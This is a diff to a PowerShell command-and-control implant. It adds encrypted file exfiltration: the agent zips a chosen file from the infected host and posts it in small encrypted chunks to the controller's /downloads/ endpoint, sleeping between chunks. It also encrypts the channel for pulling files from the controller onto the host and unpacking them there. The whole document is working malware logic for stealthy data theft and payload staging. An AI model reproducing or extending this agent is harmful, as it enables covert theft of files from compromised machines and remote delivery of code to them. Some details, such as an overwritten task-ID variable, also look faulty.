@@ -109,6 +109,8 @@ sleep $n
 
 $resultl = ("http" + ':' + "//$ip" + ':' + "$port/results/")
 $uploadl = ("http" + ':' + "//$ip" + ':' + "$port/upload/")
+$downloadl = ("http" + ':' + "//$ip" + ':' + "$port/downloads/")
+
 
 for (;;){
 
@@ -187,47 +189,143 @@ for (;;){
             elseif ($command -eq "upload"){
                 $file    = $args
                 $uploadfl = ("$uploadl" + "$file")
+                $init = "VALID init"
+                $init  = Encrypt-String $key $init
                 $data    = @{
-                    part = "init"
+                    part = "$init"
                     name = "$name"
                     }
                 $total_parts = (Invoke-WebRequest -UseBasicParsing -Uri $uploadfl -Body $data -Method 'POST').Content
                 $total_parts = Decrypt-String $key $total_parts
                 $xx = $total_parts.split()
                 if ($xx[0] -eq 'VALID') {
-                    if (Test-Path $file) {
-                        Remove-Item -Recurse -Force $file
+                    if (Test-Path "$file") {
+                        Remove-Item -Recurse -Force "$file"
                     }
                     for ($i=0; $i -le $xx[1]-1; $i=$i+1 ) {
                         # keep sleeping during exfil
                         sleep $n
-                        
+
+                        $part = "VALID " + "$i"
+                        $part  = Encrypt-String $key $part                        
                         $data    = @{
-                            part = "$i"
+                            part = "$part"
                             name = "$name"
                             }
                         $part = (Invoke-WebRequest -UseBasicParsing -Uri $uploadfl -Body $data -Method 'POST').Content
                         $dec_part_b64 = (Decrypt-String $key $part )
                         if ($dec_part_b64.split()[0] -eq 'VALID') {
                             $bytes = [System.Convert]::FromBase64String($dec_part_b64.split()[1])
-                            add-content -value $bytes -encoding byte -path $file
+                            add-content -value $bytes -encoding byte -path "$file"
                         }
                     }
-
-                    $final_file = $file.Substring(0, $file.lastIndexOf('.'))
-                    if (Test-Path $final_file) {
-                        Remove-Item -Recurse -Force $final_file
+                    $final_file = "$file".Substring(0, "$file".lastIndexOf('.'))
+                    if (Test-Path "$final_file") {
+                        Remove-Item -Recurse -Force "$final_file"
                     }
                     Expand-Archive -Path "$file" -DestinationPath .
                     Remove-Item -Recurse -Force "$file"
 
-                    $res = "VALID file uploades - " + "$final_file"
+                    $res = "VALID file downloaded - " + "$final_file"
                     $res  = Encrypt-String $key $res
                     $data    = @{result = "$res"}
                     $resultfl = ("$resultl" + "$taskId")
                     Invoke-WebRequest -UseBasicParsing -Uri $resultfl -Body $data -Method 'POST'
                 }
             }
+            elseif ($command -eq "download"){
+                $file = $args
+                if ( "$file".contains('\') ){
+                    $file_name = "$file".split('\')[-1]
+                } else {
+                    $file_name = $file
+                }
+                if (-not( Test-Path -LiteralPath "$file" -PathType leaf)) {
+                    $res = "VALID - File " + "$file_name" + " not found!"
+                    $res  = Encrypt-String $key $res
+                    $data    = @{result = "$res"}
+                    $resultfl = ("$resultl" + "$taskId")
+                    Invoke-WebRequest -UseBasicParsing -Uri $resultfl -Body $data -Method 'POST'
+                } else {
+                    $f_hash = Get-FileHash -Algorithm SHA1 -LiteralPath "$file" | Select -ExpandProperty Hash
+                    $zip_name = "$file" + ".zip"
+                    Compress-Archive -LiteralPath "$file" -Force -DestinationPath "$zip_name" -CompressionLevel Optimal
+                    $file_bin = Get-Content -Encoding Byte -Raw -Path "$zip_name"
+
+                    $lenght = $file_bin.Length
+                    $chunks_size = 200
+                    $init = "VALID init " + "$f_hash"
+                    $init  = Encrypt-String $key $init
+                    $total_chunks = [math]::ceiling($lenght/$chunks_size)
+                    $enc_len = "VALID " + "$total_chunks"
+                    $enc_len  = Encrypt-String $key $enc_len
+                    $data = @{
+                        info = "$init"
+                        name = "$name"
+                        chunk = "$enc_len"
+                    }
+                    $downloadfl = ("$downloadl" + "$file_name")
+
+
+                    ### use file ID instead of f_hash !!!!
+                    $file_id = Invoke-WebRequest -UseBasicParsing -Uri $downloadfl -Body $data -Method 'POST'
+                    $res = Decrypt-String $key $file_id
+                    $flag = $res.split()[0]
+                    sleep $n
+                    if ($flag -eq "VALID") {
+                        $fid = $res.split()[1]
+                        $fid = "VALID " + "$fid"
+                        $fid = Encrypt-String $key "$fid"
+                        
+                        $taskId_enc = "VALID " + "$taskId"
+                        $taskId_enc = Encrypt-String $key "$taskId"
+
+                        if ($lenght -le $chunks_size){
+                            $file_b64 = [System.Convert]::ToBase64String($file_bin)
+                            $part = "VALID 0 " + "$f_hash"
+                            $part  = Encrypt-String $key "$part"
+                            $content = "VALID " + "$file_b64"
+                            $content  = Encrypt-String $key "$content"
+                            $data = @{
+                                info = "$part"
+                                name = "$name"
+                                fid = "$fid"
+                                taskid = "$taskId_enc"
+                                chunk = "$content"
+                            }
+                            Invoke-WebRequest -UseBasicParsing -Uri $downloadfl -Body $data -Method 'POST'
+                        } else {
+                            for ($i=0; $i -lt $total_chunks; $i++) {
+                                $chunk_b64 = [System.Convert]::ToBase64String($file_bin[($i*$chunks_size)..($i*$chunks_size+199)])
+                                $part = "VALID " + "$i" + " " + "$f_hash"
+                                $part  = Encrypt-String $key "$part"
+                                $content = "VALID " + "$chunk_b64"
+                                $content  = Encrypt-String $key "$content"
+                                if ($i -eq $total_chunks-1) {
+                                    $data = @{
+                                        info = "$part"
+                                        name = "$name"
+                                        fid = "$fid"
+                                        chunk = "$content"
+                                        taskid = "$taskId_enc"
+                                    }
+                                } else {
+                                    $data = @{
+                                    info = "$part"
+                                    name = "$name"
+                                    fid = "$fid"
+                                    chunk = "$content"
+                                    }    
+                                }
+                                Invoke-WebRequest -UseBasicParsing -Uri $downloadfl -Body $data -Method 'POST'
+                                sleep $n
+                            }
+                        }
+                    }
+
+                }
+            }
+
             elseif ($command -eq "quit"){
                 $res = "VALID agent dead " + "$name"
                 $res  = Encrypt-String $key $res
